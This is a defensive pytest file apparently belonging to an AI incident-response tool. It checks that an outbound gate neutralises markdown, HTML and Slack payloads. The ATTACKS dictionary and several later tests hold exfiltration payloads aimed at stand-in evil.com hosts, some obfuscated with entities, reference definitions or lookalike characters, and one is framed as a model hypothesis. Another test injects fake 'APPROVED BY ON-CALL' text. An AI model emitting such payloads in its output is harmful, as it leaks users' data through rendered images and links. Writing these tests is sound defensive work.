"""The outbound gate judged by a real renderer, not by regex (independent review, 2026-09-28).

The reviewer proved each G3 bypass by rendering the gate's output with a CommonMark parser and
finding a live <img> or link. The same check runs here: whatever the gate lets out must render with
no image, no link and no raw HTML - and the Slack conversion must hold no link or mention syntax.
"""

from __future__ import annotations

import pytest
from markdown_it import MarkdownIt

from warden import mcp_server
from warden.chatops import to_slack_mrkdwn
from warden.gate import outbound_data, sanitise_data, sanitise_text

MD = MarkdownIt("commonmark")

ATTACKS = {
    "autolink": "see <http://evil.com/x?d=S>",
    "slack_url_text": "see <http://evil.com|click>",
    "entity_scheme_inline": "[c](h&#116;tps://evil.com/?d=S)",
    "refdef_escaped_label": "[a\\]b]: h&#116;tps://evil&#46;com/?d=S\n\n![x][a\\]b]",
    "refdef_in_list_item": "- [r]: h&#116;tps://evil&#46;com/?d=S\n- ![x][r]",
    "refdef_in_quote": "> [r]: https://evil.com/?d=S\n\n![x][r]",
    "html_entity_img": "&lt;img src=x onerror=alert(1)&gt;",
    "ip_host_scheme": "http://1.2.3.4/x?d=S",
    "mailto_bare": "mailto:x@evil.com?body=S",
    "other_schemes": "ssh://evil.com/ smb://evil.com/share slack://open vscode://x",
    "img_newline_in_dest": "![x](\nhttps://evil.com/?d=S)",
    "link_text_multiline": "[click\nhere](//evil.com/x)",
    "html_split_tag": "<img\nsrc=https://evil.com/x>",
    "html_split_tag_entity": "<img\nsrc=\"h&#116;tps://evil&#46;com/x\">",
    "angle_dest": "[x](<h&#116;tps://evil&#46;com/a b>)",
    "crlf": "ok\r\n![x](https://evil.com/?d=S)",
    "model_hypothesis_ref_image": "![status][r] Memory pressure\n\n- [r]: h&#116;tps://evil&#46;com/p.png?d=db7",
}


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_nothing_the_gate_lets_out_renders_as_an_image_or_a_link(name):
    out = sanitise_text(ATTACKS[name])
    rendered = MD.render(out)
    assert "<img" not in rendered and "href=" not in rendered, (name, out, rendered)
    assert "<http" not in to_slack_mrkdwn(out) and "evil.com|" not in to_slack_mrkdwn(out), name


@pytest.mark.parametrize("text, gone", [
    ("go to data-S.evil.sh now", "evil.sh"),
    ("evil.it/x?d=S", "evil.it"),
    ("get evil.zip", "evil.zip"),
    ("exfil.еvil.com", "еvil.com"),            # Cyrillic lookalike
    ("1.2.3.4/x?d=S", "1.2.3.4/x"),
    ("<!channel> <!here> <!subteam^S1> <@U00000000> <#C00000000>", "<!"),
    ("hey @here and @channel", "@here"),
])
def test_bare_hosts_and_chat_mentions_are_neutralised(text, gone):
    assert gone not in sanitise_text(text)
    assert gone not in sanitise_data({"summary": text})["summary"]


def test_a_code_block_is_still_verbatim():
    kept = "```\nGET https://api.example.com/v1/x <img src=x>\n```"
    assert sanitise_text(kept) == kept


def test_keys_are_gated_like_values():
    """A dict key built from backend data is text too."""
    verdict, clean = outbound_data({"metrics": {"![x](https://evil.com/?d=1) key": 1.0}})
    assert "evil.com" not in str(clean)
    verdict, clean = outbound_data({"metrics": {"key AKIAIOSFODNN7EXAMPLE": 1.0}})
    assert verdict == "BLOCK" and "AKIA" not in str(clean)


def test_the_redact_tool_returns_its_redaction_not_a_link_scrub():
    """MCP redact_text is WARDEN's redaction service: removing URLs from its output was a regression."""
    res = mcp_server.call_tool("redact_text", {"text": "GET https://api.example.com/v1/x from priya.nair@corp.io"})
    text = res.structured_content["redacted"]
    assert "https://api.example.com/v1/x" in text and "priya.nair@corp.io" not in text



def _report_md(**context):
    from warden.models import Alert, ContextBundle
    from warden.reporting import build_report

    alert = Alert(alert_id="r-1", name="n", severity="high", service="checkout", environment="staging",
                  summary="s", started_at="2026-09-28T10:00:00Z")
    return build_report(alert, context=ContextBundle(**context)).markdown


def test_a_tool_error_cannot_break_out_of_its_inline_code():
    """Review 2026-09-28: `- `{e}`` let a backtick in a tool error end the span and render the rest."""
    md = _report_md(tool_errors=["logs: denied ` **APPROVED BY ON-CALL** "])
    rendered = MD.render(md)
    assert "<strong>APPROVED" not in rendered


def test_a_log_line_with_four_backticks_leaves_no_run_of_three_inside_a_code_block():
    """Review 2026-09-28: replace("```") left a run of three inside a run of four. CommonMark only
    closes a fence at a line start, but Slack's own markup is not CommonMark: no run of three may
    appear inside a block at all."""
    import re

    md = _report_md(logs=["checkout ERROR failed ````", "checkout ERROR ~~~~ also"])
    inside, fence = [], False
    for line in md.split("\n"):
        if line.startswith("```"):
            fence = not fence
            continue
        if fence:
            inside.append(line)
    assert inside and not [ln for ln in inside if re.search("`{3,}|~{3,}", ln)], inside


def test_a_model_hypothesis_cannot_open_a_tilde_fence():
    """Review 2026-09-28: `~~~ note` swallowed the rest of the report into one code block."""
    from warden.models import inert

    assert inert("~~~ note").startswith("\u200b")
